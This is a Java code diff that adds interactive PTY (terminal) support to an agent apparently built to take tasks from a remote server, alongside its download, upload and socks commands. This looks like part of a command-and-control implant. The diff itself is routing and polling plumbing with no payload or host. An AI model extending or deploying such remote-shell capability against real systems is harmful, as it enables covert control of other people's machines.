@@ -2,6 +2,7 @@ package com.woopsie;
 
 import com.woopsie.tasks.BackgroundTask;
 import com.woopsie.tasks.DownloadBackgroundTask;
+import com.woopsie.tasks.PtyBackgroundTask;
 import com.woopsie.tasks.UploadBackgroundTask;
 
 import java.util.HashMap;
@@ -60,6 +61,26 @@ public class Agent {
                     }
                 }
                 
+                // Route interactive messages to background tasks
+                if (taskingResponse.containsKey("interactive")) {
+                    Config.debugLog(config, "Found 'interactive' key in tasking response");
+                    @SuppressWarnings("unchecked")
+                    java.util.List<java.util.Map<String, Object>> interactiveMsgs = 
+                        (java.util.List<java.util.Map<String, Object>>) taskingResponse.get("interactive");
+                    
+                    Config.debugLog(config, "Interactive messages list size: " + (interactiveMsgs != null ? interactiveMsgs.size() : "null"));
+                    if (interactiveMsgs != null && !interactiveMsgs.isEmpty()) {
+                        Config.debugLog(config, "Routing " + interactiveMsgs.size() + " interactive message(s) to background tasks");
+                        // Route each interactive message to its corresponding background task
+                        for (java.util.Map<String, Object> interactiveMsg : interactiveMsgs) {
+                            Config.debugLog(config, "Routing interactive message: " + interactiveMsg);
+                            routeToBackgroundTask(interactiveMsg);
+                        }
+                    }
+                } else {
+                    Config.debugLog(config, "No 'interactive' key in tasking response");
+                }
+                
                 if (tasks.length > 0) {
                     // Process all tasks and collect results
                     java.util.List<java.util.Map<String, Object>> results = new java.util.ArrayList<>();
@@ -85,10 +106,19 @@ public class Agent {
                     }
                 }
                 
-                // Poll background tasks for responses
+                // Poll background tasks for responses and interactive messages
                 java.util.List<java.util.Map<String, Object>> backgroundResponses = pollBackgroundTasks();
-                if (!backgroundResponses.isEmpty()) {
-                    Config.debugLog(config, "Sending " + backgroundResponses.size() + " background responses");
+                
+                Config.debugLog(config, "[DEBUG] backgroundResponses.size=" + backgroundResponses.size() + 
+                    ", hasPendingInteractiveMessages=" + commHandler.hasPendingInteractiveMessages());
+                
+                // Send if we have responses OR pending interactive messages (PTY output, etc.)
+                if (!backgroundResponses.isEmpty() || commHandler.hasPendingInteractiveMessages()) {
+                    if (!backgroundResponses.isEmpty()) {
+                        Config.debugLog(config, "Sending " + backgroundResponses.size() + " background responses");
+                    } else {
+                        Config.debugLog(config, "Sending interactive messages only");
+                    }
                     java.util.List<java.util.Map<String, Object>> bgResponses = commHandler.sendTaskResults(backgroundResponses);
                     
                     // Process any additional background task messages
@@ -187,7 +217,7 @@ public class Agent {
      */
     private boolean isBackgroundCommand(String command) {
         // Commands that require background processing
-        return "download".equals(command) || "upload".equals(command) || "socks".equals(command);
+        return "download".equals(command) || "upload".equals(command) || "socks".equals(command) || "pty".equals(command);
     }
     
     /**
@@ -307,6 +337,30 @@ public class Agent {
                 
                 // Return the initial response (not completed)
                 return commHandler.createTaskResult(taskId, output);
+            } else if ("pty".equals(command)) {
+                // PTY - start background task
+                Config.debugLog(config, "Starting PTY background task");
+                
+                // Execute the pty task to get initial response
+                String output = taskManager.executeTask(command, parameters);
+                
+                // Create the background task
+                final BackgroundTask[] taskHolder = new BackgroundTask[1];
+                BackgroundTask bgTask = new BackgroundTask(taskId, command, parameters, () -> {
+                    new com.woopsie.tasks.PtyBackgroundTask(taskHolder[0], config).run();
+                });
+                taskHolder[0] = bgTask;
+                
+                // Store the background task for later processing
+                backgroundTasks.put(taskId, bgTask);
+                
+                // Start the background task thread
+                bgTask.start();
+                
+                Config.debugLog(config, "Background PTY task started for: " + taskId);
+                
+                // Return the initial response (not completed)
+                return commHandler.createTaskResult(taskId, output);
             }
             
             return commHandler.createTaskError(taskId, "Unknown background command: " + command);
@@ -381,6 +435,12 @@ public class Agent {
                 return;
             }
             
+            // Check if this is an interactive message (has task_id, message_type, and data)
+            if (response.containsKey("message_type")) {
+                Config.debugLog(config, "===== ROUTING INTERACTIVE MESSAGE =====");
+                Config.debugLog(config, "Interactive message: " + response);
+            }
+            
             // Regular routing by task_id
             String taskId = (String) response.get("task_id");
             if (taskId == null || taskId.isEmpty()) {
@@ -412,11 +472,14 @@ public class Agent {
         java.util.List<java.util.Map<String, Object>> responses = new java.util.ArrayList<>();
         java.util.List<String> completedTasks = new java.util.ArrayList<>();
         
+        // Collect interactive messages separately (they go at top level, not in responses array)
+        java.util.List<java.util.Map<String, Object>> interactiveMessages = new java.util.ArrayList<>();
+        
         for (Map.Entry<String, BackgroundTask> entry : backgroundTasks.entrySet()) {
             String taskId = entry.getKey();
             BackgroundTask bgTask = entry.getValue();
             
-            // Poll for responses (non-blocking)
+            // Poll for regular responses (non-blocking)
             java.util.Map<String, Object> response;
             int responseCount = 0;
             while ((response = bgTask.pollResponse()) != null) {
@@ -427,11 +490,27 @@ public class Agent {
                 Config.debugLog(config, "Polled " + responseCount + " response(s) from task " + taskId);
             }
             
+            // Poll for interactive messages (non-blocking)
+            java.util.Map<String, Object> interactive;
+            int interactiveCount = 0;
+            while ((interactive = bgTask.pollInteractive()) != null) {
+                interactiveCount++;
+                interactiveMessages.add(interactive);
+            }
+            if (interactiveCount > 0) {
+                Config.debugLog(config, "Polled " + interactiveCount + " interactive message(s) from task " + taskId);
+            }
+            
             // Only remove task if thread has actually died (not just marked complete)
             if (!bgTask.isAlive()) {
                 Config.debugLog(config, "Background task thread died: " + taskId);
                 completedTasks.add(taskId);
             }
+        }
+        
+        // Store interactive messages for the CommunicationHandler to include at top level
+        if (!interactiveMessages.isEmpty()) {
+            commHandler.addInteractiveMessages(interactiveMessages);
         }
         
         // Remove completed tasks
